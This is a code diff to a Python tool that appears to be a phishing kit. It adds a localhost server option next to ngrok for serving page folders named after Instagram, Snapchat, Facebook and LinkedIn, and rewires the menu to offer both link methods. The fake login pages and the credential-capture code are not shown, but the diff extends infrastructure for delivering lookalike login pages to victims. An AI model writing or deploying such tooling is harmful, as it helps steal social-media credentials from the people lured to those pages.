@@ -445,17 +445,125 @@ def print_menu():
     
     return input(colored(menu_options[-1], 'white'))
 
+def serve_localhost(platform):
+    # Get the absolute path to the web directory
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    
+    # Define the directory to serve based on platform
+    if platform.lower() == 'instagram':
+        directory = os.path.join(current_dir, 'web', 'instagram')
+    elif platform.lower() == 'snapchat':
+        directory = os.path.join(current_dir, 'web', 'snapchat')
+    elif platform.lower() == 'facebook':
+        directory = os.path.join(current_dir, 'web', 'facebook')
+    elif platform.lower() == 'linkedin':
+        directory = os.path.join(current_dir, 'web', 'linkedin')
+    else:
+        print("Invalid platform selected")
+        return None
+
+    # Change to the platform directory
+    os.chdir(directory)
+    
+    try:
+        # Start a simple HTTP server in the background
+        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
+        
+        class CustomHandler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory=directory, **kwargs)
+            
+            def log_message(self, format, *args):
+                # Suppress log messages
+                pass
+                
+            def do_GET(self):
+                # Serve index.html for root path
+                if self.path == '/':
+                    self.path = '/index.html'
+                return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        
+        max_retries = 3
+        httpd = None
+        
+        for retry in range(max_retries):
+            try:
+                httpd = socketserver.TCPServer(("", PORT), CustomHandler)
+                print(f"\n✓ Local server started on port {PORT}")
+                break
+            except OSError as e:
+                if retry < max_retries - 1:
+                    print(f"× Port {PORT} is in use, trying another port...")
+                    PORT = random.randint(9001,10000)
+                else:
+                    print("× Failed to find an available port after multiple attempts")
+                    return None
+        
+        if not httpd:
+            print("× Failed to start local server")
+            return None
+            
+        # Start the server in a separate thread
+        server_thread = threading.Thread(target=httpd.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
+        
+        # Open the URL in default browser
+        url = f"http://localhost:{PORT}"
+        print("\n" + "=" * 60)
+        print(colored("Your localhost URL is ready:", 'yellow'))
+        print(colored(url, 'green', attrs=['bold']))
+        print(colored("Press Ctrl+C to stop", 'red'))
+        print("=" * 60 + "\n")
+        
+        # Open in browser
+        webbrowser.open(url)
+        
+        # Keep running until Ctrl+C
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n\nStopping server...")
+            httpd.shutdown()
+            httpd.server_close()
+            os.chdir(current_dir)  # Return to original directory
+            return None
+            
+    except Exception as e:
+        print(f"\n× Error: {str(e)}")
+        if 'httpd' in locals() and httpd:
+            httpd.shutdown()
+            httpd.server_close()
+        os.chdir(current_dir)
+        return None
+
+def generate_link(platform):
+    print("\nChoose link generation method:")
+    print("[1] Ngrok")
+    print("[2] Localhost")
+    
+    choice = input("Enter your choice: ").strip()
+    
+    if choice == '1':
+        return generate_ngrok(platform)
+    elif choice == '2':
+        return serve_localhost(platform)
+    else:
+        print("Invalid choice!")
+        return None
+
 def main():
     while True:
         choice = print_menu()
         if choice == '1':
-            generate_ngrok('instagram')
+            generate_link('instagram')
         elif choice == '2':
-            generate_ngrok('snapchat')
+            generate_link('snapchat')
         elif choice == '3':
-            generate_ngrok('facebook')
+            generate_link('facebook')
         elif choice == '4':
-            generate_ngrok('linkedin')
+            generate_link('linkedin')
         elif choice == '5':
             print("\nExiting...")
             # Kill any running ngrok process
